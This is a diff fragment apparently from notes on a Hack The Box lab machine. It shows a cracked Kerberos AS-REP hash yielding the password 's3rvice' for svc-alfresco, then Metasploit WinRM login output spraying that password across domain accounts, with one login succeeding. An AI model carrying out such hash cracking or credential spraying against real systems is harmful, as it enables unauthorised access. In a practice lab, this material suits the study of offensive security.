@@ -162,4 +162,27 @@ $krb5asrep$23$svc-alfresco@HTB:a9a1e087ad256a43a73abdeb516366fe$c3a457f6f283b8a4
 
 $krb5asrep$23$svc-alfresco@HTB:a9a1e087ad256a43a73abdeb516366fe$c3a457f6f283b8a4719b724eb1ec83a61c3cfd3f6c80a1ec940bf54e4dd5516e4c8489b8250c674166da3a88450f37f75191224ac831705e5635300c7a49c2b477da7d83515cbcc3ce93ffe2108e83728c9e9c5756293edbcb993fdc5d6a39630a531e97567564183219ac546241c7a36176f84e65cacdf46faba378b81cf8f565a1b6383de9142c37d293f007408761704dcb787b556a4af6c59edb2a9275a62a332b529348d4bd50e205e781a0a5b6a612fcde6919f9edb166f0046f6d5f685909c7c560de2c808771c9a927a0be456284187bff7f04b5b3b6d636ac2e0fb7:s3rvice
 #s3rvice
+
+msf6 auxiliary(scanner/winrm/winrm_login) > run
+
+^C
+[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/winrm/winrm_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\Administrator:s3rvice (Incorrect: )
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\Guest:s3rvice (Incorrect: )
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\krbtgt:s3rvice (Incorrect: )
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\DefaultAccount:s3rvice (Incorrect: )
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\sebastien:s3rvice (Incorrect: )
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\lucinda:s3rvice (Incorrect: )
+[+] 10.10.10.161:5985 - Login Successful: WORKSTATION\svc-alfresco:s3rvice
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\andy:s3rvice (Incorrect: )
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\mark:s3rvice (Incorrect: )
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\santi:s3rvice (Incorrect: )
+[-] 10.10.10.161: - LOGIN FAILED: WORKSTATION\zax:s3rvice (Incorrect: )
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
 ```
